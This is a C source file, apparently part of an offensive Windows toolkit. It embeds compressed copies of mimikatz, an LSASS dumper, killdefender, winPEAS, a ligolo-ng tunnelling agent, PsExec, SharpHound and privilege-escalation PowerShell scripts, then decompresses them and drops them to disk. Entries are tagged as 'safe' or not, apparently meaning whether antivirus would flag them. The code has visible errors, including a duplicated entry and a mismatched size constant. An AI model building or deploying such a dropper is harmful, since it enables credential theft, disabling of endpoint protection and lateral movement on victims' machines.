#include <Windows.h>
#include <stdio.h>
#include <compressapi.h>

#include "Message.h"
#include "MgArguments.h"
#include "DropFile.h"

#include "LoadAPI.h"

#pragma comment(lib, "Cabinet.lib")

#include "PsScript/PowerUp.h"
#include "PsScript/PrivescCheck.h"
#include "PsScript/Sherlock.h"
#include "PsScript/ADRecon.h"
#include "PsScript/PrintNightmare.h"

#include "SharpHound.h"
#include "Watson.h"
#if _WIN64
	#include "winPEASx64.h"
	#include "ligolo_ng_agent64.h"
	//#include "chiselx64.h"
	#include "accesschk64.h"
	#include "dumper64.h"
	#include "NetworkInfoGatherx64.h"
	#include "TestAvEicarx64.h"
    #include "killdefenderx64.h"
    #include "mimikatzx64.h"
    #include "PsExec64.h"
#else
	#include "winPEASx86.h"
	#include "ligolo_ng_agent86.h"
	//#include "chiselx86.h"
	#include "accesschk86.h"
	#include "dumper86.h"
    #include "NetworkInfoGather86.h"
    #include "TestAvEicarx86.h"
    #include "killdefenderx86.h"
    #include "mimikatzx86.h"
    #include "PsExec64.h"
#endif


StrucFile fileStruc[] = {
//  Filename                     Buffer                  BufferSize                     isExe   isSafe
#if _WIN64
	{L"accesschk.exe"	        ,accesschk64            ,FILE_SIZE_ACCESSCHK64          ,TRUE,  TRUE},	    // 0.120 MB
	{L"winPEAS.exe"		        ,winPEASx64	            ,FILE_SIZE_WINPEASX64           ,TRUE,  FALSE},	    // 0.747 MB
	//{L"chisel.exe"		    ,chiselx64              ,FILE_SIZE_CHISELX64            ,TRUE,  FALSE},		// 2.85 MB
	{L"DropLsass.exe"	        ,dumper64               ,FILE_SIZE_DUMPER64             ,TRUE,  TRUE},		// 0.646 MB
	{L"NetworkInfoGatherx64.exe",NetworkInfoGatherx64   ,FILE_SIZE_NETWORKINFOGATHERX64 ,TRUE,  TRUE},		// 0.796 MB
	{L"ligolo_ng_agent64.exe"	,ligolo_ng_agent64      ,FILE_SIZE_LIGOLO_NG_AGENT64    ,TRUE,  TRUE},		// 1.449 MB
	{L"TestAvEicarx64.exe"	    ,TestAvEicarx64         ,FILE_SIZE_TESTAVEICARX64       ,TRUE,  TRUE},		// 0.700 MB
	{L"killdefenderx64.exe"	    ,killdefenderx64        ,FILE_SIZE_KILLDEFENDERX64      ,TRUE,  TRUE},		// 1.488 MB
    {L"mimi.exe"	            ,mimikatzx64            ,FILE_SIZE_MIMIKATZX64          ,TRUE,  FALSE},		// 0.552 kb
    {L"PsExec.exe"	            ,PsExec64               ,FILE_SIZE_PSEXEC64             ,TRUE,  FALSE},		// 0.299 kb
#else
	{L"accesschk.exe"	        ,accesschk86            ,FILE_SIZE_ACCESSCHK86          ,TRUE,  TRUE},	    // 0.21 MB
	{L"winPEAS.exe"		        ,winPEASx86	            ,FILE_SIZE_WINPEASX86           ,TRUE,  FALSE},	    // 0.47 MB
	//{L"chisel.exe"		    ,chiselx86              ,FILE_SIZE_CHISELX86            ,TRUE,  FALSE},	    // 2.71 MB
	{L"DropLsass.exe"           ,dumper86               ,FILE_SIZE_DUMPER86             ,TRUE,  TRUE},	    // 2.71 MB
    {L"NetworkInfoGather.exe"	,NetworkInfoGather86    ,FILE_SIZE_NETWORKINFOGATHER86  ,TRUE,  TRUE},		// 0.89 MB
    {L"ligolo_ng_agent.exe"	    ,ligolo_ng_agent86      ,FILE_SIZE_LIGOLO_NG_AGENT86    ,TRUE,  TRUE},		// 1.449 MB
    {L"TestAvEicar.exe"	        ,TestAvEicarx86         ,FILE_SIZE_TESTAVEICARX86       ,TRUE,  TRUE},		// 
    {L"killdefender.exe"	    ,killdefenderx86        ,FILE_SIZE_KILLDEFENDERX86      ,TRUE,  TRUE},		// 70 kb
    {L"mimi.exe"	            ,mimikatz86             ,FILE_SIZE_MIMIKATZ86           ,TRUE,  FALSE},		// 70 kb
    {L"mimi.exe"	            ,mimikatz86             ,FILE_SIZE_MIMIKATZ86           ,TRUE,  FALSE},		// 70 kb
    {L"PsExec.exe"	            ,PsExec86               ,FILE_SIZE_MIMIKATZ86          ,TRUE,  FALSE},		// 
#endif
    {L"SharpHound.exe"	        ,SharpHound             ,FILE_SIZE_SHARPHOUND           ,TRUE,  FALSE},	    //  732 KB
    {L"Watson.exe"	            ,Watson                 ,FILE_SIZE_WATSON               ,TRUE,  FALSE},	    //  732 KB

	{L"PowerUp.ps1"	            ,PowerUp                ,FILE_SIZE_POWERUP              ,FALSE, FALSE},	    //  217 KB
	{L"PrivescCheck.ps1"        ,PrivescCheck           ,FILE_SIZE_PRIVESCCHECK         ,FALSE, FALSE},	    //  67  KB
	{L"Sherlock.ps1"	        ,Sherlock               ,FILE_SIZE_SHERLOCK             ,FALSE, FALSE},	    //  3   KB
	{L"ADRecon.ps1"	            ,ADRecon                ,FILE_SIZE_ADRECON              ,FALSE, FALSE},	    //  105 KB
	//{L"PrintNightmare.ps1"	,PrintNightmare         ,FILE_SIZE_PRINTNIGHTMARE       ,FALSE, FALSE},	    //  124 KB
};


/*


'DecompressedBufferSize' was corrupted.
*/
BOOL DecompressDrop(LPCWSTR dropPath, PBYTE CompressedBuffer, DWORD InputFileSize) {
    DECOMPRESSOR_HANDLE Decompressor = NULL;
    PBYTE DecompressedBuffer = NULL;

    HANDLE DecompressedFile = INVALID_HANDLE_VALUE;
    BOOL DeleteTargetFile = TRUE;
    BOOL Success;
    SIZE_T DecompressedBufferSize;
    SIZE_T DecompressedDataSize;
    DWORD ByteWritten;
    BOOL retValue = TRUE;

    //  Open an empty file for writing, if exist, destroy it.
    DecompressedFile = CreateFileW(dropPath, GENERIC_WRITE | DELETE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); 
    if (DecompressedFile == INVALID_HANDLE_VALUE) {
        printMsg(STATUS_ERROR2, LEVEL_DEFAULT, "Cannot create file \t%ws", dropPath);
        return FALSE;
    }

    //  Create an XpressHuff decompressor.
    if (!CreateDecompressor(COMPRESS_ALGORITHM_XPRESS_HUFF, NULL, &Decompressor)) {
        printMsg(STATUS_ERROR2, LEVEL_DEFAULT, "Cannot create a decompressor");
        retValue = FALSE;
        goto done;
    }

    //  Query decompressed buffer size.
    //  Allocate memory for decompressed buffer.
    if (!Decompress(Decompressor, CompressedBuffer, InputFileSize, NULL, 0, (PSIZE_T)&DecompressedBufferSize)) {
        DWORD ErrorCode = GetLastError();
        if (ErrorCode != ERROR_INSUFFICIENT_BUFFER || DecompressedBufferSize == 0) {
            printMsg(STATUS_ERROR2, LEVEL_DEFAULT, "Cannot decompress data");
            retValue = FALSE;
            goto done;
        }

        DecompressedBuffer = (PBYTE)malloc(DecompressedBufferSize*10);
        if (DecompressedBuffer == NULL) {
            printMsg(STATUS_ERROR2, LEVEL_DEFAULT, "Cannot allocate memory for decompressed buffer");
            retValue = FALSE;
            goto done;
        }
    }
    //  Decompress data and write data to DecompressedBuffer.
    if (!Decompress(Decompressor, CompressedBuffer, InputFileSize, DecompressedBuffer, DecompressedBufferSize, (PSIZE_T)&DecompressedDataSize)) {
        printMsg(STATUS_ERROR2, LEVEL_DEFAULT, "Cannot decompress data");
        retValue = FALSE;
        goto done;
    }
    //  Write decompressed data to output file.
    Success = WriteFile(DecompressedFile, DecompressedBuffer, (DWORD)DecompressedDataSize, &ByteWritten, NULL); 
    if ((ByteWritten != DecompressedDataSize) || (!Success)) {
        printMsg(STATUS_ERROR2, LEVEL_DEFAULT, "Cannot write decompressed data to file");
        retValue = FALSE;
        goto done;
    }
    DeleteTargetFile = FALSE;
done:
    if (Decompressor != NULL)
        CloseDecompressor(Decompressor);
    if (DecompressedBuffer) 
        free(DecompressedBuffer);


    if (DecompressedFile != INVALID_HANDLE_VALUE) {
        //  Compression fails, delete the compressed file.
        if (DeleteTargetFile) {
            FILE_DISPOSITION_INFO fdi;
            fdi.DeleteFile = TRUE;      //  Marking for deletion
            Success = SetFileInformationByHandle(DecompressedFile, FileDispositionInfo, &fdi, sizeof(FILE_DISPOSITION_INFO));
            if (!Success) {
                printMsg(STATUS_ERROR2, LEVEL_DEFAULT, "Cannot delete corrupted decompressed file");
                retValue = FALSE;
            }
        }
        CloseHandle(DecompressedFile);
    }
    return retValue;
}

BOOL DropFile(char* wincatDefaultDir, StrucFile fileStruc) {
	//FILE* pFile;
	//const WCHAR* defaultDropPath = L"C:\\ProgramData\\WinTools"; // "C:\\Users\\Public\\Documents";
	//const WCHAR* defaultPsDropPath = L"C:\\ProgramData\\WinTools\\PsScript"; // "C:\\Users\\Public\\Documents";
    WCHAR* pathFile;
    BOOL isDirPs = TRUE;


    WCHAR defaultDropPath[MAX_PATH * sizeof(WCHAR)];
    WCHAR defaultPsDropPath[MAX_PATH * sizeof(WCHAR)];
    swprintf_s(defaultDropPath, MAX_PATH * sizeof(WCHAR), L"%hs", wincatDefaultDir);


	if (!CreateDirectoryW(defaultDropPath, NULL)) {
		if (GetLastError() == ERROR_PATH_NOT_FOUND) {
			printMsg(STATUS_ERROR2, LEVEL_DEFAULT, "ERROR_PATH_NOT_FOUND %ws", defaultDropPath);
			return FALSE;
		}
	}


    if (!fileStruc.isExe) {
        swprintf_s(defaultPsDropPath, MAX_PATH * sizeof(WCHAR), L"%hs\\PsScript", wincatDefaultDir);
        if (!CreateDirectoryW(defaultPsDropPath, NULL)) {
            if (GetLastError() == ERROR_PATH_NOT_FOUND) {
                printMsg(STATUS_ERROR2, LEVEL_DEFAULT, "ERROR_PATH_NOT_FOUND %ws", defaultDropPath);
                return FALSE;
            }
            else
                isDirPs = FALSE;
        }
    }

    pathFile = (WCHAR*)calloc(MAX_PATH + 1, sizeof(WCHAR));
    if (pathFile == NULL)
        return FALSE;
	
    if(fileStruc.isExe || !isDirPs)
	    swprintf_s(pathFile, (MAX_PATH +1), L"%s\\%s", defaultDropPath, fileStruc.filename);
    else
        swprintf_s(pathFile, (MAX_PATH + 1), L"%s\\%s", defaultPsDropPath, fileStruc.filename);



    if (DecompressDrop(pathFile, (PBYTE)fileStruc.buffer, fileStruc.size)){
        printMsg(STATUS_INFO2, LEVEL_DEFAULT, "Dropping: '%ws' %i kb\n", pathFile, fileStruc.size / 100);
        free(pathFile);
        return TRUE;
    }

    printMsg(STATUS_ERROR2, LEVEL_DEFAULT, "Fail to dropFile %ws", fileStruc.filename);
	free(pathFile);
	return FALSE;
}


BOOL DropFiles(char* wincatDefaultDir, ToDropEnum toDROP) {
	switch (toDROP){
	case Nothing:
		break;
	case ALL:
		for (int i = 0; i < sizeof(fileStruc) / sizeof(StrucFile); i++)
			DropFile(wincatDefaultDir, fileStruc[i]);
		break;
    case SAFE:
		for (int i = 0; i < sizeof(fileStruc) / sizeof(StrucFile); i++)
            if(fileStruc[i].isSafe)
			    DropFile(wincatDefaultDir, fileStruc[i]);
		break;
	default:
		DropFile(wincatDefaultDir, fileStruc[toDROP]);
		break;
	}
	return FALSE;
}